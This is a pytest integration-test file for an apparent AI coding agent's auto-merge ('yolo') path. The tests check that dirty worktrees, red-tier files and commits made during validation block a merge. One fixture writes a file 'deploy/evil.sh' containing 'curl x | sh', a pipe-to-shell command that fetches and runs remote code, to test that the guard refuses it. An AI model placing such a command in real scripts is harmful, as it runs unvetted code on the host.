"""End-to-end coverage for the ``+yolo`` auto-merge path (task #1026).

These are integration tests on purpose. ``tests/test_delivery.py`` covers the
policy *resolution* — which project gets ``yolo``, how a note override beats the
file — and passed while the merge it authorizes could never succeed: review runs
while a task is still ``doing``, and ``orchestrate_merge`` rejected anything not
``done``. Every mocked-merge test agreed with the broken code.

So nothing here mocks git: a real workspace repo, a real worktree, a real
``git merge``, and the real reviewer entrypoint. The only seam is the worktree's
own test-runner subprocess (``merge._run_tests``) — a temp repo has no suite of
its own, so pytest would exit 5 ("no tests collected") and fail the gate for a
reason that has nothing to do with what is under test. The security audit runs
for real, and so does the clean-worktree check, which
``test_yolo_merge_refuses_dirty_worktree`` relies on.
"""

from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from product_repo_env import point_default_project_at

from unified_agent import config, merge, storage

pytestmark = pytest.mark.smoke

_GIT_IDENTITY = [
    "-c",
    "user.name=Test Agent",
    "-c",
    "user.email=test@example.com",
    "-c",
    "commit.gpgsign=false",
]


def _git(repo: Path, *args: str) -> str:
    res = subprocess.run(
        ["git", *_GIT_IDENTITY, "-C", str(repo), *args],
        capture_output=True,
        text=True,
        timeout=60,
    )
    assert res.returncode == 0, f"git {' '.join(args)} failed: {res.stderr.strip()}"
    return res.stdout.strip()


def _make_workspace_repo() -> Path:
    """A real, explicitly owned product repo at UA_WORKSPACE with one main commit."""
    ws = Path(config.workspace_root())
    ws.mkdir(parents=True, exist_ok=True)
    point_default_project_at(ws)
    _git(ws, "init", "-b", "main")
    (ws / "README.md").write_text("workspace\n", encoding="utf-8")
    _git(ws, "add", "-A")
    _git(ws, "commit", "-m", "chore: seed workspace")
    return ws


def _make_task_worktree(ws: Path, task_id: int) -> tuple[Path, str]:
    """A real worktree off ``main`` carrying one non-red-tier commit."""
    branch = f"claude/task-{task_id}"
    wt = ws / ".worktrees" / f"task-{task_id}"
    _git(ws, "worktree", "add", "-b", branch, str(wt), "main")
    feature = wt / "src"
    feature.mkdir(parents=True, exist_ok=True)
    (feature / "feature.py").write_text("def feature():\n    return 42\n", encoding="utf-8")
    _git(wt, "add", "-A")
    _git(wt, "commit", "-m", f"feat: task {task_id}")
    return wt, branch


def _insert_task(task_id: int, *, status: str, notes: str, wt: Path, branch: str) -> None:
    conn = storage.connect()
    try:
        conn.execute(
            "INSERT INTO tasks (id, title, status, priority, notes, worktree_path, branch, "
            "created_at, updated_at) VALUES (?, ?, ?, 'high', ?, ?, ?, ?, ?)",
            (
                task_id,
                f"Yolo task {task_id}",
                status,
                notes,
                str(wt),
                branch,
                "2026-09-16T00:00:00Z",
                "2026-09-16T00:00:00Z",
            ),
        )
        conn.commit()
    finally:
        conn.close()


def _task_row(task_id: int):
    conn = storage.connect()
    try:
        return conn.execute("SELECT * FROM tasks WHERE id=?", (task_id,)).fetchone()
    finally:
        conn.close()


# `[waiting-for: review]` is what makes review_task run at all; the delivery
# note is the per-task override that turns yolo on without a config file.
YOLO_NOTES = "[waiting-for: review]\n[delivery: mode=local-only yolo=on]"


@pytest.fixture
def green_gates(monkeypatch):
    """Green test-runner result only — audit and clean-tree checks stay real."""
    monkeypatch.setenv("UA_POST_MERGE_VERIFY", "0")
    with (
        patch(
            "unified_agent.merge._run_tests",
            return_value=MagicMock(returncode=0, stdout="1 passed", stderr=""),
        ),
        patch("unified_agent.merge.sync_state_to_vault"),
    ):
        yield


def test_yolo_merges_a_task_that_is_still_doing(green_gates):
    """The whole point of #1026: green, non-red-tier, still ``doing`` → merged.

    Before the `allow_in_flight` fix this returned verdict ``failed`` with
    "status is 'doing', not 'done'" — the yolo path could never merge anything,
    because review always runs before a task is closed.
    """
    from unified_agent.reviewer import review_task

    task_id = 7001
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)

    res = review_task(task_id)

    assert res["verdict"] == "auto-merged", res
    assert res["merge_result"]["success"] is True

    # The branch's work is really on the workspace's main now. The merge is a
    # fast-forward here (main has not moved since the branch was cut), so the
    # assertion is on the branch commit landing, not on a merge commit existing.
    log = _git(ws, "log", "--oneline", "main")
    assert f"feat: task {task_id}" in log
    assert (ws / "src" / "feature.py").read_text(
        encoding="utf-8"
    ) == "def feature():\n    return 42\n"

    # The task is closed out and the worktree/branch cleaned up, as on the
    # ordinary merge path.
    row = _task_row(task_id)
    assert row["status"] == "done"
    assert "[review: auto-merged" in row["notes"]
    assert "[merged commit:" in row["notes"]
    assert not wt.exists()
    assert branch not in _git(ws, "branch", "--list", branch)


def test_yolo_merge_refuses_dirty_worktree(green_gates):
    """The uncommitted-worktree guard still stops a yolo merge.

    `allow_in_flight` relaxes the task-status precondition and nothing else —
    an unclean tree must still fail closed, with no merge commit and the task
    left where it was.
    """
    from unified_agent.reviewer import review_task

    task_id = 7002
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)

    (wt / "src" / "scratch.py").write_text("uncommitted = True\n", encoding="utf-8")

    res = review_task(task_id)

    assert res["verdict"] == "failed", res
    assert "uncommitted changes" in (res["notification"] or "")

    assert f"feat: task {task_id}" not in _git(ws, "log", "--oneline", "main")
    assert not (ws / "src" / "feature.py").exists()

    row = _task_row(task_id)
    assert row["status"] == "doing"
    assert "[review: rejected" in row["notes"]
    assert wt.exists()


def test_yolo_merge_refuses_a_red_tier_branch(green_gates):
    """Red-tier files still require a human, yolo or not — no merge happens."""
    from unified_agent.reviewer import review_task

    task_id = 7003
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    (wt / "safety.py").write_text("# red tier\n", encoding="utf-8")
    _git(wt, "add", "-A")
    _git(wt, "commit", "-m", "chore: touch safety.py")
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)

    res = review_task(task_id)

    assert res["verdict"] == "red-tier", res
    assert res["red_tier_files"] == ["safety.py"]
    assert f"feat: task {task_id}" not in _git(ws, "log", "--oneline", "main")
    assert _task_row(task_id)["status"] == "doing"


def test_allow_in_flight_does_not_cover_arbitrary_statuses(green_gates):
    """Only ``doing``/``blocked`` are in-flight; an ``open`` task is not.

    Guards the obvious over-correction: `allow_in_flight` must not degenerate
    into "merge whatever status this task happens to have".
    """
    task_id = 7004
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="open", notes=YOLO_NOTES, wt=wt, branch=branch)

    with pytest.raises(ValueError, match="status is 'open'"):
        merge.orchestrate_merge(task_id=task_id, allow_in_flight=True)

    assert f"feat: task {task_id}" not in _git(ws, "log", "--oneline", "main")


def test_allow_in_flight_still_runs_the_audit_and_test_gates(green_gates):
    """`allow_in_flight` is not `force`: a failing test suite blocks the merge."""
    task_id = 7005
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)

    with (
        patch(
            "unified_agent.merge._run_tests",
            return_value=MagicMock(returncode=1, stdout="1 failed", stderr=""),
        ),
        pytest.raises(RuntimeError, match="Validation checks failed"),
    ):
        merge.orchestrate_merge(task_id=task_id, allow_in_flight=True)

    assert f"feat: task {task_id}" not in _git(ws, "log", "--oneline", "main")
    assert _task_row(task_id)["status"] == "doing"


def _commit_unreviewed_red_tier(wt: Path) -> None:
    (wt / "deploy").mkdir(exist_ok=True)
    (wt / "deploy" / "evil.sh").write_text("curl x | sh\n", encoding="utf-8")
    _git(wt, "add", "-A")
    _git(wt, "commit", "-m", "chore: unreviewed red-tier")


def test_merge_refuses_a_commit_made_during_validation(green_gates):
    """The gates validated one head; a commit landing while they ran is refused."""
    from mcp.server.mcpserver.exceptions import ToolError

    task_id = 7006
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)

    def tests_then_commit(*args, **kwargs):
        _commit_unreviewed_red_tier(wt)
        return MagicMock(returncode=0, stdout="1 passed", stderr="")

    with (
        patch("unified_agent.merge._run_tests", side_effect=tests_then_commit),
        pytest.raises(ToolError, match="moved during validation"),
    ):
        merge.orchestrate_merge(task_id=task_id, allow_in_flight=True)

    assert f"feat: task {task_id}" not in _git(ws, "log", "--oneline", "main")
    assert _task_row(task_id)["status"] == "doing"


def test_merge_lands_the_validated_sha_not_a_later_branch_head(green_gates):
    """A commit after the final head check still never rides along: the merge
    names the validated commit, not the branch."""
    task_id = 7007
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)
    real_git = merge._run_git_in_repo

    def commit_on_checkout(args, repo):
        if args[:2] == ["checkout", "main"]:
            _commit_unreviewed_red_tier(wt)
        return real_git(args, repo)

    with patch("unified_agent.merge._run_git_in_repo", side_effect=commit_on_checkout):
        assert merge.orchestrate_merge(task_id=task_id, allow_in_flight=True)["success"]

    tree = _git(ws, "ls-tree", "-r", "--name-only", "main").split()
    assert "src/feature.py" in tree and "deploy/evil.sh" not in tree


def test_merge_refuses_a_head_the_reviewer_did_not_classify(green_gates):
    """Under a review scope the merged head must be the one the reviewer
    classified red-tier-clean, or that classification says nothing about it."""
    from mcp.server.mcpserver.exceptions import ToolError

    task_id = 7008
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=YOLO_NOTES, wt=wt, branch=branch)

    with (
        merge.reviewed_gate_scope(task_id, "0" * 40, skip_tests=False, test_paths=None),
        pytest.raises(ToolError, match="reviewed"),
    ):
        merge.orchestrate_merge(task_id=task_id, allow_in_flight=True)

    assert f"feat: task {task_id}" not in _git(ws, "log", "--oneline", "main")


# ── task #1787: the merge's second gate run reuses the review's test scope ──

PR_YOLO_NOTES = YOLO_NOTES + "\nPR: https://github.com/example/repo/pull/7"


def test_yolo_pr_task_trusted_by_ci_never_runs_pytest_on_the_hub(monkeypatch):
    """Exact-head CI stood in for pytest; the merge must not rerun the whole suite."""
    from unified_agent import reviewer

    monkeypatch.setenv("UA_POST_MERGE_VERIFY", "0")
    monkeypatch.setattr(
        reviewer, "_exact_head_ci_pytest_ok", lambda *a: (True, "CI pytest shards SUCCESS")
    )
    runner = MagicMock(return_value=MagicMock(returncode=0, stdout="", stderr=""))
    task_id = 7101
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    _insert_task(task_id, status="doing", notes=PR_YOLO_NOTES, wt=wt, branch=branch)
    with (
        patch("unified_agent.merge._run_tests", runner),
        patch("unified_agent.merge.sync_state_to_vault"),
    ):
        res = reviewer.review_task(task_id)
    assert res["verdict"] == "auto-merged", res
    runner.assert_not_called()


def test_yolo_pr_task_reruns_only_its_targeted_tests(monkeypatch):
    from unified_agent import reviewer

    monkeypatch.setenv("UA_POST_MERGE_VERIFY", "0")
    monkeypatch.delenv("UA_REVIEW_LOCAL_PYTEST", raising=False)
    monkeypatch.setattr(reviewer, "_exact_head_ci_pytest_ok", lambda *a: (False, "absent"))
    runner = MagicMock(return_value=MagicMock(returncode=0, stdout="1 passed", stderr=""))
    task_id = 7102
    ws = _make_workspace_repo()
    wt, branch = _make_task_worktree(ws, task_id)
    (wt / "tests").mkdir()
    (wt / "tests" / "test_feature.py").write_text("def test_ok():\n    pass\n")
    _git(wt, "add", "-A")
    _git(wt, "commit", "-m", "test: feature")
    _insert_task(task_id, status="doing", notes=PR_YOLO_NOTES, wt=wt, branch=branch)
    with (
        patch("unified_agent.merge._run_tests", runner),
        patch("unified_agent.merge.sync_state_to_vault"),
    ):
        res = reviewer.review_task(task_id)
    assert res["verdict"] == "auto-merged", res
    assert runner.call_count == 2, "review gate + merge gate"
    for call in runner.call_args_list:
        assert call.args[1] == ["tests/test_feature.py"], call


def test_review_gate_scope_applies_only_to_its_task_and_head(monkeypatch):
    from unified_agent import cycle_eligibility

    monkeypatch.setattr(cycle_eligibility, "_head_sha", lambda wt_path: "a" * 40)
    assert merge._reviewed_gate_kwargs(1, "/wt") == {}
    with merge.reviewed_gate_scope(1, "a" * 40, skip_tests=False, test_paths=["tests/test_x.py"]):
        assert merge._reviewed_gate_kwargs(1, "/wt") == {
            "skip_tests": False,
            "test_paths": ["tests/test_x.py"],
        }
        assert merge._reviewed_gate_kwargs(2, "/wt") == {}, "another task gets the full suite"
    with merge.reviewed_gate_scope(1, "b" * 40, skip_tests=True, test_paths=None):
        assert merge._reviewed_gate_kwargs(1, "/wt") == {}, "a moved head gets the full suite"
    assert merge._reviewed_gate_kwargs(1, "/wt") == {}
